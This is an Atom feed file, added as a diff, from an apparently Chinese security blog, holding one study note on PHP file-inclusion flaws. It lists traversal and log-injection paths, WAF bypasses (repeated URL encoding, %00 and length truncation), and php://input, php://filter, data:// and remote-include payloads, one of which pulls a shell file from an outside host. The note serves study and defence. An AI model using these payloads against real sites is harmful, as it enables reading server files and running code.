@@ -1,0 +1,157 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://mobius-0.github.io</id>
+    <title>Khala • Posts by &#34;包含&#34; tag</title>
+    <link href="https://mobius-0.github.io" />
+    <updated>2022-11-26T13:02:44.000Z</updated>
+    <category term="Hexo" />
+    <category term="shoya" />
+    <category term="网站" />
+    <category term="网络安全" />
+    <category term="工具" />
+    <category term="虚拟机" />
+    <category term="星际争霸2" />
+    <category term="平衡" />
+    <category term="杂谈" />
+    <category term="小说" />
+    <category term="江南" />
+    <category term="龙族" />
+    <category term="动画" />
+    <category term="法律法规" />
+    <category term="域名" />
+    <category term="DNS" />
+    <category term="WEB" />
+    <category term="HTTP" />
+    <category term="计算机网络" />
+    <category term="IPSec" />
+    <category term="VPN" />
+    <category term="SSL" />
+    <category term="TLS" />
+    <category term="WiFi" />
+    <category term="邮件" />
+    <category term="网络协议" />
+    <category term="Linux" />
+    <category term="渗透" />
+    <category term="信息收集" />
+    <category term="痕迹清理" />
+    <category term="Windows" />
+    <category term="ASP" />
+    <category term="CSharp" />
+    <category term="Golang" />
+    <category term="Java" />
+    <category term="语言" />
+    <category term="反序列化" />
+    <category term="混淆" />
+    <category term="沙箱" />
+    <category term="类" />
+    <category term="JDK" />
+    <category term="JavaScript" />
+    <category term="PHP" />
+    <category term="PowerShell" />
+    <category term="Python" />
+    <category term="Ruby" />
+    <category term="Shell" />
+    <category term="漏洞" />
+    <category term="CSRF" />
+    <category term="服务器" />
+    <category term="SQL注入" />
+    <category term="SSRF" />
+    <category term="Cache" />
+    <category term="XSS" />
+    <category term="XXE" />
+    <category term="XML" />
+    <category term="Xpath" />
+    <category term="注入" />
+    <category term="函数" />
+    <category term="绕过" />
+    <category term="遍历" />
+    <category term="包含" />
+    <category term="文件" />
+    <category term="目录" />
+    <category term="读取" />
+    <category term="上传" />
+    <category term="中间件" />
+    <category term="IIS" />
+    <category term="Apache" />
+    <category term="Nginx" />
+    <category term="逻辑" />
+    <category term="策略配置" />
+    <category term="端口" />
+    <category term="社会工程学" />
+    <category term="搜索" />
+    <entry>
+        <id>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/</id>
+        <title>文件包含</title>
+        <link rel="alternate" href="https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/"/>
+        <content type="html">&lt;h2 id=&#34;基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础&#34;&gt;#&lt;/a&gt; 基础&lt;/h2&gt;
+&lt;p&gt;常见的文件包含漏洞的形式为  &lt;code&gt;&amp;lt;?php include(&amp;quot;inc/&amp;quot; . $_GET[&#39;file&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;考虑常用的几种包含方式为&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;同目录包含  &lt;code&gt;file=.htaccess&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;目录遍历  &lt;code&gt;?file=../../../../../../../../../var/lib/locate.db&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;日志注入  &lt;code&gt;?file=../../../../../../../../../var/log/apache/error.log&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;利用  &lt;code&gt;/proc/self/environ&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试&lt;/p&gt;
+&lt;h2 id=&#34;触发sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#触发sink&#34;&gt;#&lt;/a&gt; 触发 Sink&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;PHP
+&lt;ul&gt;
+&lt;li&gt;include
+&lt;ul&gt;
+&lt;li&gt;在包含过程中出错会报错，不影响执行后续语句&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;include_once
+&lt;ul&gt;
+&lt;li&gt;仅包含一次&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;require
+&lt;ul&gt;
+&lt;li&gt;在包含过程中出错，就会直接退出，不执行后续语句&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;require_once&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;绕过技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过技巧&#34;&gt;#&lt;/a&gt; 绕过技巧&lt;/h2&gt;
+&lt;p&gt;常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式&lt;/p&gt;
+&lt;h3 id=&#34;url编码绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url编码绕过&#34;&gt;#&lt;/a&gt; url 编码绕过&lt;/h3&gt;
+&lt;p&gt;如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过&lt;/p&gt;
+&lt;h3 id=&#34;特殊字符绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊字符绕过&#34;&gt;#&lt;/a&gt; 特殊字符绕过&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;某些情况下，读文件支持使用 Shell 通配符，如  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;*&lt;/code&gt;  等&lt;/li&gt;
+&lt;li&gt;url 中 使用  &lt;code&gt;?&lt;/code&gt;   &lt;code&gt;#&lt;/code&gt;  可能会影响 include 包含的结果&lt;/li&gt;
+&lt;li&gt;某些情况下，unicode 编码不同但是字形相近的字符有同一个效果&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;00截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#00截断&#34;&gt;#&lt;/a&gt; %00 截断&lt;/h3&gt;
+&lt;p&gt;几乎是最常用的方法，条件是  &lt;code&gt;magic_quotes_gpc&lt;/code&gt;  关闭，而且 php 版本小于 5.3.4。&lt;/p&gt;
+&lt;h3 id=&#34;长度截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度截断&#34;&gt;#&lt;/a&gt; 长度截断&lt;/h3&gt;
+&lt;p&gt;Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。&lt;/p&gt;
+&lt;p&gt;msdn 定义  &lt;code&gt;#define MAX_PATH 260&lt;/code&gt; ，其中第 260 个字符为字符串结尾的  &lt;code&gt;\0&lt;/code&gt;  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。&lt;/p&gt;
+&lt;p&gt;获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255&lt;/p&gt;
+&lt;p&gt;那么在长度有限的时候， &lt;code&gt;././././&lt;/code&gt;  (n 个) 的形式就可以通过这个把路径爆掉&lt;/p&gt;
+&lt;p&gt;在 php 代码包含中，这种绕过方式要求 php 版本 &amp;lt; php 5.2.8&lt;/p&gt;
+&lt;h3 id=&#34;伪协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#伪协议绕过&#34;&gt;#&lt;/a&gt; 伪协议绕过&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;远程包含：要求  &lt;code&gt;allow_url_fopen=On&lt;/code&gt;  且  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ， payload 为  &lt;code&gt;?file=[http|https|ftp]://websec.wordpress.com/shell.txt&lt;/code&gt;  的形式&lt;/li&gt;
+&lt;li&gt;PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;  ，payload 为  &lt;code&gt;?file=php://input&lt;/code&gt;  的形式&lt;/li&gt;
+&lt;li&gt;Base64: 使用 Base64 伪协议读取文件，payload 为  &lt;code&gt;?file=php://filter/convert.base64-encode/resource=index.php&lt;/code&gt;  的形式&lt;/li&gt;
+&lt;li&gt;data: 使用 data 伪协议读取文件，payload 为  &lt;code&gt;?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=&lt;/code&gt;  的形式，要求  &lt;code&gt;allow_url_include=On&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;协议绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议绕过&#34;&gt;#&lt;/a&gt; 协议绕过&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;allow_url_fopen&lt;/code&gt;  和  &lt;code&gt;allow_url_include&lt;/code&gt;  主要是针对  &lt;code&gt;http&lt;/code&gt;   &lt;code&gt;ftp&lt;/code&gt;  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。&lt;/p&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=&#34;&gt;Exploit with PHP Protocols&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==&#34;&gt;lfi cheat sheet&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="包含" />
+        <category term="文件" />
+        <category term="目录" />
+        <updated>2022-11-26T13:02:44.000Z</updated>
+    </entry>
+</feed>
